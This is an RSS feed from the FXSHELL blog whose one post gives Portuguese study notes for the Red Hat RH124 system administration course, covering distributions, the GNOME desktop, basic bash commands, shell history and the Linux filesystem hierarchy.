<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <docs>https://blogs.law.harvard.edu/tech/rss</docs>
    <title>FXSHELL</title>
    <link>/posts/</link>
    <description>Recent content on FXSHELL</description>
    <ttl>1440</ttl>
    <generator>Hugo 0.81.0</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 23 Mar 2021 02:38:38 UT</lastBuildDate>
    <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Redhat RH124</title>
      <link>/posts/redhat-rh124/</link>
      <pubDate>Wed, 17 Mar 2021 02:03:55 UT</pubDate>
      <guid>/posts/redhat-rh124/</guid>
      <description>Red Hat System Administration I O curso Red Hat System Administration I (RH124) foi desenvolvido para profissionais de TI sem experiência anterior em administração de sistemas Linux. O recurso tem como objetivo fornecer aos alunos &amp;ldquo;habilidades de sobrevivência&amp;rdquo; de administração do Linux, com foco em tarefas centrais de administração. O Red Hat System Administration I também oferece uma base para os alunos que planejam se tornar administradores de sistemas Linux em tempo integral, apresentando os principais conceitos de linha de comando e ferramentas de nível corporativo.</description>
      <content:encoded><![CDATA[Red Hat System Administration I O curso Red Hat System Administration I (RH124) foi desenvolvido para profissionais de TI sem experiência anterior em administração de sistemas Linux. O recurso tem como objetivo fornecer aos alunos &amp;ldquo;habilidades de sobrevivência&amp;rdquo; de administração do Linux, com foco em tarefas centrais de administração. O Red Hat System Administration I também oferece uma base para os alunos que planejam se tornar administradores de sistemas Linux em tempo integral, apresentando os principais conceitos de linha de comando e ferramentas de nível corporativo. Esses conceitos serão mais desenvolvidos no próximo curso, Red Hat System Administration II (RH134).
Fedora Fedora é um projeto comunitário que produz e lança um sistema operacional completo, gratuito e baseado em Linux. A Red Hat patrocina a comunidade e trabalha com representantes da comunidade para integrar o mais recente software upstream a uma distribuição rápida e segura. O projeto Fedora contribui com tudo de volta para o mundo open source livre, e qualquer pessoa pode participar.
No entanto, o Fedora se concentra na inovação e na excelência, e não na estabilidade de longo prazo. Novas atualizações importantes acontecem a cada seis meses e podem trazer mudanças significativas. O Fedora é compatível somente com lançamentos por cerca de um ano (duas atualizações principais), o que o torna menos adequado para uso empresarial.
Red Hat Enterprise Linux O Red Hat Enterprise Linux (RHEL) é a distribuição do Linux da Red Hat pronta para empresas e com suporte comercial. É a plataforma líder para computação open source, não apenas uma coleção de projetos open source maduros. O RHEL é extensivamente testado, tem um grande ecossistema de suporte de parceiros, certificações de hardware e software, serviços de consultoria, treinamento e suporte de vários anos e garantias de manutenção.
A Red Hat baseia suas principais versões do RHEL no Fedora. No entanto, em função disso, a Red Hat pode escolher quais pacotes incluir, fazer outras melhorias (contribuiu com os projetos de upstream e Fedora) e tomar decisões de configuração que atendam às necessidades dos clientes. A Red Hat ajuda os fornecedores e clientes a se envolverem com a comunidade de open source e a trabalhar com o desenvolvimento upstream para desenvolver soluções e corrigir problemas.
O Red Hat Enterprise Linux usa um modelo de distribuição baseado em subscrição. Como este é um software open source, esta não é uma taxa de licença. Em vez disso, ela paga o suporte, a manutenção, as atualizações, patches de segurança, acesso à base de conhecimento no Red Hat Customer Portal (http://access.redhat.com/), certificações e assim por diante. O cliente está pagando por suporte e expertise de longo prazo, comprometimento e assistência quando necessário.
Quando grandes atualizações são disponibilizadas, os clientes podem implementá-las quando for mais conveniente para eles e sem pagar mais. Isso simplifica o gerenciamento das atualizações de sistema nos aspectos econômico e prático.
CentOS O CentOS é uma distribuição Linux orientada pela comunidade e derivada em grande parte da base de código open source da Red Hat Enterprise Linux e outras fontes. É gratuito, fácil de instalar e conta com equipe e suporte de uma comunidade ativa de voluntários que opera independentemente da Red Hat.
Introdução ao ambiente GNOME de área de trabalho O ambiente de desktop é a interface gráfica do usuário em um sistema Linux. O ambiente de área de trabalho padrão no Red Hat Enterprise Linux 8 é fornecido pelo GNOME 3. Ele fornece aos usuários uma área de trabalho integrada, além de uma plataforma de desenvolvimento unificada fornecida pelo Wayland (por padrão) ou pelo X Window System legado.
O GNOME Shell oferece as principais funções de interface de usuário do ambiente GNOME de área de trabalho. O aplicativo GNOME Shell é altamente personalizável. O padrão do Red Hat Enterprise Linux 8 para a aparência do GNOME Shell é o tema &amp;ldquo;Padrão&amp;rdquo;, que é usado nesta seção. O padrão do Red Hat Enterprise Linux 7 era um tema alternativo chamado &amp;ldquo;Clássico&amp;rdquo;, que estava mais perto da aparência de versões mais antigas do GNOME. O tema pode ser selecionado de modo persistente no login, clicando o ícone de engrenagem ao lado do botão Sign In depois de selecionar a conta e antes de digitar a senha.
Partes do GNOME Shell Os elementos do GNOME Shell incluem as seguintes partes, conforme ilustrado por esta captura de tela do GNOME Shell no modo de visão geral Activities:
  Barra superior: a barra que fica no topo da tela. Ela é exibido na visão geral Activities e nos espaços de trabalho. A barra superior oferece o botão Activities, além dos controles de volume, rede, acesso ao calendário e a alternância entre os métodos de entrada de teclado (se mais de uma estiver configurada).
  Activities overview: este é um modo especial que ajuda um usuário a organizar janelas e iniciar aplicativos. A visão geral Activities pode ser inserida clicando no botão Activities no canto superior esquerdo da barra superior ou pressionando a tecla Super. A tecla Super (às vezes chamada de tecla do Windows ou a tecla Command), fica perto do canto inferior esquerdo de um PC IBM de 104/105 teclas ou de um teclado Apple. As três áreas principais da visão geral Activities são o dash, à esquerda da tela, a windows overview, no centro da tela, e o workspace selector, no lado direito da tela.
  System menu: o menu no canto superior direito na barra superior fornece controle para ajustar o brilho da tela e para ativar ou desativar as conexões de rede. Abaixo do submenu do nome de usuário estão as opções para ajustar das configurações de conta e fazer o logout do sistema ou desligar. O menu do sistema também oferece botões para abrir a janela Settings, bloquear a tela ou desligar o sistema.
  Dash: é uma lista configurável de ícones dos aplicativos favoritos do usuário, dos aplicativos que estão em execução e um botão de grid na parte inferior do dash que pode ser usado para selecionar aplicativos arbitrários. Você pode iniciar os aplicativos clicando em um dos ícones ou usando a grade para encontrar um aplicativo menos usado. O dash também é, às vezes, chamado de dock.
  Windows overview: uma área no centro da visão geral Activities, que exibe miniaturas de todas as janelas ativas na área de trabalho atual. Isso permite que as janelas sejam mais facilmente colocadas em primeiro plano em um espaço de trabalho desordenado ou movidas para outro espaço de trabalho.
  Workspace selector: uma área à direita da visão geral Activities, que exibe miniaturas de todas as áreas de trabalho ativas e permite que as áreas de trabalho sejam selecionadas e as janelas sejam movidas de uma área de trabalho para outra.
  Bandeja de mensagens: oferece uma maneira de acessar as notificações enviadas por aplicativos ou componentes do sistema ao GNOME. Se uma notificação ocorrer, normalmente, ela será exibida primeiro brevemente como uma única linha na parte superior da tela e um indicador persistente aparecerá no centro da barra superior ao lado do relógio para informar o usuário sobre as notificações que foram recebidas recentemente. Você pode abrir a bandeja de mensagens para analisar essas notificações clicando no relógio na barra superior ou pressionando Super&#43;m. Você pode fechar a bandeja de mensagens clicando no relógio na barra superior ou pressionando Esc ou Super&#43;M novamente.
  Você pode visualizar e editar os atalhos de teclado do GNOME usados por sua conta. Abra o menu do sistema no lado direito da barra superior. Clique no botão Settings na parte inferior do menu à esquerda. Na janela do aplicativo que é aberta, selecione Devices → Keyborad no painel esquerdo. O painel direito exibirá suas configurações de atalho atuais.
Nota Pode ser difícil enviar alguns atalhos de teclado, como as teclas de função ou a tecla Super, para uma máquina virtual. Isso ocorre porque as teclas especiais usadas por esses atalhos podem ser capturadas pelo sistema operacional local ou pelo aplicativo que você está usando para acessar a área de trabalho gráfica de sua máquina virtual.
Importante Nos ambientes de treinamento virtual e individualizado atuais da Red Hat, usar a tecla Super pode ser um pouco complicado. Você provavelmente não poderá usar a tecla Super do teclado porque ela, muitas vezes, não é passada para a máquina virtual no ambiente de sala de aula pelo seu navegador da web.
Na parte superior da janela do navegador que exibe a interface da sua máquina virtual, deve haver um ícone de teclado no lado direito. Se você clicar nele, será aberto um teclado na tela. Clicando novamente, o teclado na tela será fechado.
O teclado na tela trata a Super como uma tecla modificadora que é frequentemente pressionada com outra tecla. Se você clicar nela uma vez, ela ficará amarela, indicando que está sendo pressionada. Então, para pressionar Super&#43;M no teclado na tela, clique em Super e em M.
Se você desejar apenas pressionar e soltar Super no teclado na tela, deverá clicar duas vezes nela. O primeiro clique mantém a tecla Super pressionada, e o segundo clique a libera.
As outras teclas tratadas como teclas modificadoras (como a Super) pelo teclado na tela são Shift, Ctrl, Alt e Caps. As teclas Esc e Menu são tratadas como teclas normais e não como teclas modificadoras.
Espaços de trabalho Os espaços de trabalho são telas separadas que têm janelas de aplicativo diferentes. Eles podem ser usados para organizar seu ambiente de trabalho agrupando janelas de aplicativo abertas por tarefas. Por exemplo, janelas usadas para executar uma determinada atividade de manutenção do sistema (como a configuração de um novo servidor remoto) podem ser agrupadas em um espaço de trabalho, enquanto e-mails e outros aplicativos de comunicação podem ser agrupados em outro espaço de trabalho.
Há dois métodos simples para alternar entre espaços de trabalho. um método, talvez o mais rápido, é pressionar Ctrl&#43;Alt&#43;seta para cima ou Ctrl&#43;Alt&#43;seta para baixo para alternar entre espaços de trabalho em sequência. O segundo é alternar para a visão geral Activities desejada e clicar no espaço de trabalho.
Uma vantagem de usar a visão geral Activities é que as janelas podem ser clicadas e arrastadas entre o espaço de trabalho usando o workspace selector à direita da tela, e a windows overview, no centro da tela.
Importante Assim como a Super, nos ambientes atuais de treinamento virtual e individualizado da Red Hat, as combinações de teclas Ctrl&#43;Alt não são geralmente passadas para a máquina virtual no ambiente de sala de aula pelo seu navegador da web.
Você pode inserir essas combinações de teclas para alternar espaços de trabalho usando o teclado na tela. Pelo menos dois espaços de trabalho precisam estar em uso. Abra o teclado na tela e clique em Ctrl, Alt e, em seguida, na seta para cima ou na seta para baixo.
No entanto, nesses ambientes de treinamento, geralmente é mais simples evitar os atalhos de teclado e o teclado na tela. Alterne espaços de trabalho clicando no botão Activities e, em seguida, no seletor de área de trabalho à direita da visão geral Activities, clicando no espaço de trabalho para o qual você deseja alternar.
Inicialização de um terminal Para obter um prompt do shell no GNOME, inicie um aplicativo de terminal gráfico, como o GNOME Terminal. Há várias maneiras de fazer isso. Os dois métodos mais usados estão listados abaixo:
Na visão geral Activities, selecione Terminal no dash (na área dos favoritos, encontrando-o com o botão de grade (no agrupamento Utilities) ou usando o campo de pesquisa na parte superior da windows overview).
Pressione a combinação de teclas Alt&#43;F2 para abrir Enter a Command e digite gnome-terminal.
Quando uma janela de terminal for aberta, um prompt do shell será exibido ao usuário que iniciou o programa de terminal gráfico. O prompt do shell e a barra de título da janela de terminal indicam o nome de usuário atual, o nome do host e o diretório de trabalho.
Bloqueio de tela ou logout É possível bloquear a tela ou fazer o logout totalmente a partir do menu de sistema no lado direito da barra superior.
Para bloquear a tela, no menu do sistema no canto superior direito, clique no botão de bloqueio na parte inferior do menu ou pressione Super&#43;L (que pode ser mais fácil de lembrar como Windows&#43;L). A tela também é bloqueada se a sessão gráfica ficar inativa por alguns minutos.
Uma lock screen curtain (cortina de tela de bloqueio) aparece, mostrando a hora do sistema e o nome do usuário conectado. Para desbloquear a tela, pressione Enter ou espaço para levantar a cortina de bloqueio de tela; em seguida, insira a senha do usuário na tela de bloqueio.
Para fazer o logout e finalizar a sessão de login gráfico atual, selecione o menu do sistema no canto superior direito da barra superior e clique em (User) → Log Out. Uma janela é exibida, oferecendo a opção de Cancel ou confirmar a ação Log out.
Desligamento ou reinicialização do sistema Para desligar o sistema, no menu do sistema no canto superior direito, clique no botão liga/desliga na parte inferior do menu ou pressione Ctrl&#43;Alt&#43;Del. Na caixa de diálogo exibida, você pode escolher Power Off (Desligar) ou Restart (Reiniciar) a máquina; ou Cancel (Cancelar) a operação. Se você não fizer uma escolha, o sistema será desligado automaticamente após 60 segundos.
Sintaxe básica de comandos O GNU Bourne-Again Shell (bash) é um programa que interpreta comandos digitados pelo usuário. Cada string digitada no shell pode ter até três partes: o comando, as opções (que geralmente começam com - ou &amp;ndash;) e os argumentos. Cada palavra digitada no shell é separada por espaços. Comandos são os nomes dos programas que estão instalados no sistema. Cada comando tem suas próprias opções e argumentos.
Quando estiver pronto para executar um comando, pressione a tecla Enter. Digite cada comando em uma linha separada. A saída do comando é exibida antes que o próximo prompt do shell seja exibido.
[user@host]$ whoami user [user@host]$ Se quiser digitar mais de um comando em uma única linha, use um ponto e vírgula (;) como separador de comandos. Um ponto e vírgula é um membro de uma classe de caracteres chamada metacaracteres que tem significados especiais para o bash. Nesse caso, a saída de ambos os comandos será exibida antes de o próximo prompt shell aparecer.
O exemplo a seguir mostra como combinar dois comandos (command1 e command2) na linha de comando.
[user@host]$ command1;command2 Exemplos de comandos simples O comando date mostra a data e a hora atuais. Ele também pode ser usado pelo superusuário para ajustar o relógio do sistema. Um argumento que começa por um sinal de mais (&#43;) define a string de formatação para o comando date.
[user@host ~]$ date Sat Jan 26 08:13:50 IST 2019 [user@host ~]$ date &#43;%R 08:13 [user@host ~]$ date &#43;%x 01/26/2019 O comando passwd altera a senha do próprio usuário. A senha original da conta deverá ser indicada para que uma alteração seja permitida. Por padrão, passwd está configurado para solicitar uma senha segura, composta por letras minúsculas, maiúsculas, números e símbolos e que não seja baseada em uma palavra do dicionário. O superusuário pode usar o comando passwd para alterar as senhas de outros usuários.
[user@host ~]$ passwd Changing password for user user. Current password: old_password New password: new_password Retype new password: new_password passwd: all authentication tokens updated successfully. O Linux não exige extensões de nome de arquivo para classificar arquivos por tipo. O comando file varre o início do conteúdo de um arquivo e exibe seu tipo. Os arquivos a serem classificados serão passados como argumentos ao comando.
[user@host ~]$ file /etc/passwd /etc/passwd: ASCII text [user@host ~]$ file /bin/passwd /bin/passwd: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a3637110e27e9a48dced9f38b4ae43388d32d0e4, stripped [user@host ~]$ file /home /home: directory Visualização do conteúdo dos arquivos Um dos comandos mais simples e frequentemente usados no Linux é o cat. O comando cat permite criar múltiplos arquivos ou arquivos únicos, visualizar o conteúdo dos arquivos, concatenar o conteúdo de vários arquivos e redirecionar o conteúdo do arquivo a um terminal ou a arquivos.
O exemplo mostra como visualizar o conteúdo do arquivo /etc/passwd.
[user@host ~]$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin ...output omitted... Use o comando a seguir para exibir o conteúdo de vários arquivos.
[user@host ~]$ cat file1 file2 Hello World!! Introduction to Linux commands. Alguns arquivos são muito longos e podem ocupar mais espaço para serem exibidos do que o fornecido pelo terminal. O comando cat não exibe o conteúdo de um arquivo como páginas. O comando less exibe uma página de um arquivo de cada vez e permite que você percorra as páginas.
O comando less permite que você avance e volte nas páginas por meio de arquivos mais compridos que cabem em uma janela de terminal. Use as teclas de seta para cima e seta para baixo para rolar para cima e para baixo. Pressione q para sair do comando.
Os comandos head e tail exibem o início e o fim de um arquivo, respectivamente. Por padrão, esses comandos exibem 10 linhas do arquivo, mas ambos têm uma opção -n que permite especificar um número diferente de linhas. O arquivo a ser exibido será passado como um argumento para esses comandos.
[user@host ~]$ head /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin [user@host ~]$ tail -n 3 /etc/passwd gdm:x:42:42::/var/lib/gdm:/sbin/nologin gnome-initial-setup:x:977:977::/run/gnome-initial-setup/:/sbin/nologin avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin O comando wc conta linhas, palavras e caracteres em um arquivo. É preciso de uma opção -l, -w ou -c para exibir apenas linhas, palavras ou caracteres, respectivamente.
[user@host ~]$ wc /etc/passwd 45 102 2480 /etc/passwd [user@host ~]$ wc -l /etc/passwd ; wc -l /etc/group 45 /etc/passwd 70 /etc/group [user@host ~]$ wc -c /etc/group /etc/hosts 966 /etc/group 516 /etc/hosts 1482 total Preenchimento com Tab O preenchimento com Tab permite que o usuário complete comandos ou nomes de arquivo rapidamente depois de digitar uma parte suficiente no prompt para torná-los exclusivos. Se os caracteres digitados não forem únicos, pressionar a tecla Tab duas vezes mostra todos os comandos iniciados pelos caracteres já digitados.
[user@host ~]$ pas1Tab&#43;Tab passwd paste pasuspender [user@host ~]$ pass2Tab [user@host ~]$ passwd Changing password for user user. Current password: 1 Pressione Tab duas vezes.
2 Pressione Tab uma vez.
O preenchimento com Tab pode ser usado para completar os nomes de arquivo ao digitá-los como argumentos de comandos. Quando a tecla Tab é pressionada, ela preenche o nome do arquivo, tanto quanto possível. Pressionar Tab uma segunda vez fará com que o shell liste todos os arquivos que correspondam ao padrão atual. Digite caracteres adicionais até o nome ser exclusivo e use o preenchimento com Tab para completar o comando.
[user@host ~]$ ls /etc/pas1Tab [user@host ~]$ ls /etc/passwd2Tab passwd passwd- 1 2 Pressione Tab uma vez.
É possível corresponder argumentos e opções usando o preenchimento com Tab para muitos comandos. O comando useradd é usado pelo superusuário, root, para criar usuários adicionais no sistema. Muitas opções podem ser usadas para controlar como esse comando se comporta. O preenchimento com Tab após uma opção parcial pode ser utilizado para concluir a opção sem precisar digitar muito.
[root@host ~]## useradd --1Tab&#43;Tab --base-dir --groups --no-log-init --shell --comment --help --non-unique --skel --create-home --home-dir --no-user-group --system --defaults --inactive --password --uid --expiredate --key --root --user-group --gid --no-create-home --selinux-user [root@host ~]## useradd -- 1 Pressione Tab duas vezes.
Continuação de um longo comando em outra linha Comandos com muitas opções e argumentos podem rapidamente se tornar longos e são automaticamente envolvidos pela janela de comando quando o cursor atinge a margem direita. Em vez disso, para facilitar a legibilidade do comando, você pode digitar um comando longo usando mais de uma linha.
Para fazer isso, você usará um caractere de barra invertida (), referido como o caractere escape, para ignorar o significado do caractere imediatamente após a barra invertida. Você aprendeu que inserir um caractere de nova linha, pressionando a tecla Enter, informa ao shell que a entrada do comando está completa e que o comando deve ser executado. Ao usar o escape para o caractere de nova linha, o shell é instruído a mudar para uma nova linha de comando sem o executar. O shell reconhece a solicitação exibindo um prompt de continuação, chamado de prompt secundário, usando o caractere maior do que (&amp;gt;) por padrão em uma nova linha vazia. Os comandos podem ser continuados em muitas linhas.
[user@host]$ head -n 3 \ &amp;gt; /usr/share/dict/words \ &amp;gt; /usr/share/dict/linux.words ==&amp;gt; /usr/share/dict/words &amp;lt;== 1080 10-point 10th ==&amp;gt; /usr/share/dict/linux.words &amp;lt;== 1080 10-point 10th [user@host ~]$ Importante O exemplo de tela anterior mostra como um comando continuado aparece para um usuário típico. No entanto, promover esse realismo em materiais didáticos, como este livro, geralmente causa confusão. Os novos alunos podem inserir por engano o caractere maior do que adicional como parte do comando digitado. O shell interpreta um caractere maior do que digitado como redirecionamento de processo, o que não era o objetivo do usuário. O redirecionamento de processos é discutido em um próximo capítulo.
Para evitar essa confusão, este livro não mostrará prompts secundários nas saídas da tela. Um usuário ainda verá o prompt secundário em sua janela do shell, mas o material do curso exibe intencionalmente apenas caracteres para serem digitados, conforme demonstrado no exemplo abaixo. Compare com o exemplo de tela anterior.
[user@host]$ head -n 3 \ /usr/share/dict/words \ /usr/share/dict/linux.words ==&amp;gt; /usr/share/dict/words &amp;lt;== 1080 10-point 10th ==&amp;gt; /usr/share/dict/linux.words &amp;lt;== 1080 10-point 10th [user@host ~]$ Histórico de comandos O comando history exibe uma lista de comandos executados anteriormente precedidos por um número.
O caractere ponto de exclamação (!) é um metacaractere usado para expandir comandos anteriores sem precisar redigitá-los. O comando !number expande o comando que corresponde ao número indicado. O comando !string expande o comando mais recente que começa com a string especificada.
[user@host ~]$ history ...output omitted... 23 clear 24 who 25 pwd 26 ls /etc 27 uptime 28 ls -l 29 date 30 history [user@host ~]$ !ls ls -l total 0 drwxr-xr-x. 2 user user 6 Mar 29 21:16 Desktop ...output omitted... [user@host ~]$ !26 ls /etc abrt hosts pulse adjtime hosts.allow purple aliases hosts.deny qemu-ga ...output omitted... As teclas de seta podem ser usadas para navegar pelos comandos anteriores no histórico do shell. A seta para cima edita o comando anterior na lista do histórico. A seta para baixo edita o próximo comando na lista do histórico. A seta para a esquerda e a seta para a direita movem o cursor para a esquerda e para a direita no comando atual da lista de histórico, para que você possa editá-lo antes de executá-lo.
Você pode usar a combinação de teclas Esc&#43;. ou Alt&#43;. para inserir a última palavra do comando anterior na localização atual do cursor. O uso repetido da combinação de teclas substituirá esse texto pela última palavra dos comandos anteriores do histórico. A combinação de teclas Alt&#43;. é particularmente conveniente porque você pode segurar Alt e pressionar . repetidamente para percorrer facilmente pelos comandos anteriores.
Edição da linha de comando Quando usado de forma interativa, bash tem um recurso de edição de linha de comando. Isso permite que o usuário utilize os comandos do editor de texto para se mover e modificar o comando atual sendo digitado. O movimento no comando atual e a passagem pelo histórico de comandos usando as teclas de seta foram introduzidos anteriormente nesta sessão. Comandos de edição mais poderosos são apresentados na tabela a seguir.
Atalho = Descrição
Ctrl&#43;A =&amp;gt; Ir para o início da linha de comando.
Ctrl&#43;E =&amp;gt; Ir para o final da linha de comando.
Ctrl&#43;U =&amp;gt; Limpar do cursor ao início da linha de comando.
Ctrl&#43;K =&amp;gt; Limpar do cursor até o final da linha de comando.
Ctrl&#43;seta =&amp;gt; para a esquerda Ir para o início da palavra anterior na linha de comando.
Ctrl&#43;seta =&amp;gt; para a direita Ir para o final da próxima palavra na linha de comando.
Ctrl&#43;R =&amp;gt; Pesquisar um padrão na lista de histórico de comandos.
Há vários outros comandos de edição de linha de comando disponíveis, mas esses são os comandos mais úteis para novos usuários. Os outros comandos podem ser encontrados na página do man bash
 Use o comando date para exibir a data e a hora atuais  [student@workstation ~]$ date Thu Jan 22 10:13:04 PDT 2019 Mostrar a hora atual no formato de 12 horas (por exemplo, 11:42:11 AM). Dica: a string de formato que exibe a saída é %r.  [student@workstation ~]$ date &#43;%r 10:14:07 AM Qual tipo de arquivo é /home/student/zcat? Ele é legível?  ➜ ~ file /usr/bin/zcat /usr/bin/zcat: POSIX shell script, ASCII text executable Use o comando wc e os atalhos do Bash para exibir o tamanho de zcat.  ➜ ~ wc /usr/bin/zcat 51 299 1984 /usr/bin/zcat Exiba as 10 primeiras linhas de zcat.  ➜ ~ head h10 /usr/bin/zcat head: não foi possível abrir &amp;#39;h10&amp;#39; para leitura: Arquivo ou diretório inexistente ==&amp;gt; /usr/bin/zcat &amp;lt;== #!/bin/sh # Uncompress files to standard output. # Copyright (C) 2007, 2010-2018 Free Software Foundation, Inc. # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 3 of the License, or # (at your option) any later version. Exiba as 10 últimas linhas do arquivo zcat.  ➜ ~ tail -n 10 /usr/bin/zcat With no FILE, or when FILE is -, read standard input. Report bugs to &amp;lt;bug-gzip@gnu.org&amp;gt;.&amp;#34; case $1in --help) printf &amp;#39;%s\n&amp;#39; &amp;#34;$usage&amp;#34; || exit 1; exit;; --version) printf &amp;#39;%s\n&amp;#39; &amp;#34;$version&amp;#34; || exit 1; exit;; esac exec gzip -cd &amp;#34;$@&amp;#34; Repita o comando anterior exato pressionando as teclas três vezes ou menos.  Repita o comando anterior exato. Pressione a tecla de seta para cima uma vez para voltar no histórico do comando e pressione Enter (duas vezes), ou digite o comando de atalho !! e, depois, pressione Enter (três vezes) para executar o comando mais recente no histórico de comandos. (Tente usar ambos.)
[student@workstation]$ !! tail zcat With no FILE, or when FILE is -, read standard input. Report bugs to &amp;lt;bug-gzip@gnu.org&amp;gt;.&amp;#34; case $1in --help) printf &amp;#39;%s\n&amp;#39; &amp;#34;$usage&amp;#34; || exit 1;; --version) printf &amp;#39;%s\n&amp;#39; &amp;#34;$version&amp;#34; || exit 1;; esac exec gzip -cd &amp;#34;$@&amp;#34; Repita o comando anterior, mas use a opção -n 20 para exibir as últimas 20 linhas no arquivo. Use a edição de linha de comando para fazer isso com o mínimo de pressionamento de teclas.  ➜ ~ tail -n 20 /usr/bin/zcat -l, --list list compressed file contents -q, --quiet suppress all warnings -r, --recursive operate recursively on directories -S, --suffix=SUF use suffix SUF on compressed files --synchronous synchronous output (safer if system crashes, but slower) -t, --test test compressed file integrity -v, --verbose verbose mode --help display this help and exit --version display version information and exit With no FILE, or when FILE is -, read standard input. Report bugs to &amp;lt;bug-gzip@gnu.org&amp;gt;.&amp;#34; case $1in --help) printf &amp;#39;%s\n&amp;#39; &amp;#34;$usage&amp;#34; || exit 1; exit;; --version) printf &amp;#39;%s\n&amp;#39; &amp;#34;$version&amp;#34; || exit 1; exit;; esac exec gzip -cd &amp;#34;$@&amp;#34; Use o histórico do shell para executar o comando date &#43;%r novamente.  [student@workstation ~]$ history 1 date 2 date &#43;%r 3 file zcat 4 wc zcat 5 head zcat 6 tail zcat 7 tail -n 20 zcat 8 history [student@workstation ~]$ !2 date &#43;%r 10:49:56 AM =&amp;gt; O shell Bash é um interpretador de comandos que solicita aos usuários interativos que especifiquem os comandos do Linux.
=&amp;gt; Muitos comandos têm uma opção &amp;ndash;help que exibe uma tela ou mensagem de uso.
=&amp;gt; A utilização de espaços de trabalho facilita a organização de várias janelas de aplicativos.
=&amp;gt; O botão Activities no canto superior esquerdo da barra superior fornece um modo de visão geral que ajuda o usuário a organizar janelas e iniciar aplicativos.
=&amp;gt; O comando file varre o início do conteúdo de um arquivo e exibe seu tipo.
=&amp;gt; Os comandos head e tail exibem o início e o fim de um arquivo, respectivamente.
=&amp;gt; Você pode usar o preenchimento Tab para preencher nomes de arquivos ao digitá-los como argumentos para os comandos.
https://rha.ole.redhat.com/rha/app/courses/rh124-8.2/pages/ch03
Capítulo 3. Gerenciamento de arquivos na linha de comando A hierarquia do sistema de arquivos
Todos os arquivos em um sistema Linux são armazenados em sistemas de arquivos, que são organizados em uma única árvore de diretório invertida, conhecida como hierarquia do sistema de arquivos. Essa árvore é invertida porque dizemos que a raiz dela está na parte superior da hierarquia e os ramos de diretórios e subdiretórios se estendem abaixo da raiz (root).
O diretório / é o diretório root no topo da hierarquia do sistema de arquivos. O caractere / também é usado como separador de diretórios nos nomes de arquivos. Por exemplo, se etc for um subdiretório do diretório /, é possível chamá-lo de /etc. Do mesmo modo, se o diretório /etc contiver um arquivo chamado issue, é possível referir-se ao arquivo como /etc/issue.
Os subdiretórios de / são usados com fins padronizados para organizar arquivos por tipo e finalidade. Assim, fica mais fácil encontrar arquivos. Por exemplo, no diretório root, o subdiretório /boot é utilizado para armazenar os arquivos necessários para o boot do sistema.
Nota Os seguintes termos ajudam a descrever o conteúdo do diretório do sistema de arquivos:
=&amp;gt; O conteúdo estático permanece inalterado até que seja editado ou reconfigurado.
=&amp;gt; O conteúdo dinâmico ou variável pode ser modificado ou inserido pelos processos ativos.
=&amp;gt; O conteúdo persistente permanece após uma reinicialização, como definições de configuração.
=&amp;gt; O conteúdo de tempo de execução é específico de processos ou sistemas e é excluído por uma reinicialização.
Diretórios importantes do Red Hat Enterprise Linux /usr
Software instalado, bibliotecas compartilhadas, arquivos incluídos e dados de programas somente leitura. Subdiretórios importantes incluem: /usr/bin: comandos de usuário. /usr/sbin: comandos de administração do sistema. /usr/local: software personalizado localmente. /etc
Arquivos de configuração específicos deste sistema. /var
Dados variáveis específicos deste sistema que devem persistir entre boots do sistema. Os arquivos que mudam de modo dinâmico; por exemplo, bancos de dados, diretórios de cache, arquivos de log, documentos com spool de impressora e conteúdo de sites podem ser encontrados em /var. /run
Dados de tempo de execução de processos iniciados desde o último boot. Isso inclui arquivos de ID de processos e arquivos de bloqueio, entre outros. O conteúdo desse diretório é recriado na reinicialização. Este diretório consolida /var/run e /var/lock de versões anteriores do Red Hat Enterprise Linux. /home
Diretórios pessoais são os locais onde os usuários normais armazenam seus dados pessoais e arquivos de configuração. /root
Diretório pessoal do superusuário administrativo, root. /tmp
Um espaço gravável para arquivos temporários. Arquivos não acessados, alterados nem modificados por 10 dias são excluídos automaticamente desse diretório. Há outro diretório temporário, /var/tmp, no qual os arquivos que não tiverem sido acessados, alterados ou modificados por mais de 30 dias serão excluídos automaticamente. /boot
Arquivos necessários para começar o processo de boot. /dev
Contém arquivos de dispositivos especiais que são usados pelo sistema para acessar o hardware. Importante No Red Hat Enterprise Linux 7 e posteriores, quatro diretórios mais antigos em / têm o mesmo conteúdo de suas contrapartes localizadas em /usr:
/bin e /usr/bin
/sbin e /usr/sbin
/lib e /usr/lib
/lib64 e /usr/lib64
Em versões anteriores do Red Hat Enterprise Linux, esses diretórios eram diferentes e continham conjuntos distintos de arquivos.
No Red Hat Enterprise Linux 7 e posteriores, os diretórios em / são links simbólicos para as pastas correspondentes em /usr.
Especificação de arquivos por nome A visualização do navegador de arquivos comum (à esquerda) é equivalente à visualização descendente (à direita).
O caminho de um arquivo ou diretório especifica o local exclusivo no sistema de arquivos. Seguir o caminho de um arquivo atravessa um ou mais subdiretórios nomeados, delimitados por uma barra (/), até chegar ao destino. Os diretórios, também chamados de pastas, contêm outros arquivos e outros subdiretórios. Eles podem ser referenciados da mesma maneira que os arquivos.
